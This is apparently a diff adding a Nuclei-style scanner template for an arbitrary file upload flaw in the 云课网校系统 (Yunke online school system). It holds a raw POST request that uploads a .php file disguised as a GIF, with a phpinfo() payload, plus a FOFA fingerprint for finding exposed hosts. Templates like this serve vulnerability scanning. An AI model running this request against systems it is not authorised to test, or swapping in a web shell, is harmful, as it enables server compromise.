@@ -1,0 +1,43 @@
+id: yunke-fileupload
+
+info:
+  name: 云课网校系统文件上传漏洞
+  author: qwtd
+  severity: critical
+  description: 云课网校系统存在文件上传漏洞，攻击者可利用该漏洞上传任意文件。
+  reference:
+    - https://github.com/wy876/POC/blob/0add3e2624917470e0be3f4ee666cc69df5319b9/%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F/%E4%BA%91%E8%AF%BE%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(DVB-2024-6594).md
+  metadata:
+    fofa: "/static/libs/common/jquery.stickyNavbar.min.js"
+  tags: 云课网校系统
+
+http:
+  - raw:
+      - |
+        POST /api/uploader/uploadImage HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+        Cache-Control: no-cache
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykvjj6DIn0LIXxe9m
+        x-requested-with: XMLHttpRequest
+
+        ------WebKitFormBoundaryLZbmKeasWgo2gPtU
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
+        Content-Type: image/gif
+
+        <?php phpinfo();?>
+        ------WebKitFormBoundaryLZbmKeasWgo2gPtU--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"code":1'
+          - '"url":"'
+        condition: and
+      - type: status
+        status:
+          - 200
